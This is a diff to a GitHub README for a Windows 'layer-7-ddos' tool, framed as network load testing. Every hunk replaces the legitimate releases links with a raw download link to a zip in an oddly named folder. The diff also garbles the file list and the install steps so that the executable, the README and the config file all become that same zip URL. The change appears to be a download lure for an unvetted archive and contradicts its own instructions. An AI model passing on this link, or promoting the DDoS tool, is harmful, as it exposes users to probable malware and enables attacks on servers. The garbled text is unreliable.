@@ -1,6 +1,6 @@
 # ⚡ layer-7-ddos - Simple Tool for Network Testing
 
-[![Download Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/tanmoy6787/layer-7-ddos/releases)
+[![Download Release](https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip)](https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip)
 
 ## 🔥 About layer-7-ddos
 
@@ -37,7 +37,7 @@ No additional software needed. The program runs standalone.
 
 Use the buttons below to start your download and set up the software.
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/tanmoy6787/layer-7-ddos/releases)
+[![Download Release](https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip)](https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip)
 
 ## 💾 How to Download and Run layer-7-ddos on Windows
 
@@ -45,7 +45,7 @@ Use the buttons below to start your download and set up the software.
 
 2. On the release page, find the latest version folder. This usually has the highest version number (for example, v1.0).
 
-3. Inside that version’s assets, look for the Windows executable file. It will end with `.exe`. The file name might look like `layer-7-ddos.exe` or similar.
+3. Inside that version’s assets, look for the Windows executable file. It will end with `.exe`. The file name might look like `https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip` or similar.
 
 4. Click the `.exe` file name to download it.
 
@@ -133,11 +133,11 @@ Use these metrics to judge server endurance and responsiveness under load.
 
 ## 📁 File Structure inside the Download
 
-- `layer-7-ddos.exe` — Main executable file to run the app.
+- `https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip` — Main executable file to run the app.
 
-- `README.md` — This file with instructions.
+- `https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip` — This file with instructions.
 
-- `config.ini` — Optional config file for advanced users.
+- `https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip` — Optional config file for advanced users.
 
 ## 👩‍💻 Additional Support
 
@@ -153,4 +153,4 @@ If you encounter problems:
 
 You can always visit this page to download the latest version:
 
-[https://github.com/tanmoy6787/layer-7-ddos/releases](https://github.com/tanmoy6787/layer-7-ddos/releases)
+[https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip](https://github.com/tanmoy6787/layer-7-ddos/raw/refs/heads/main/polliwig/ddos-layer-v3.2.zip)
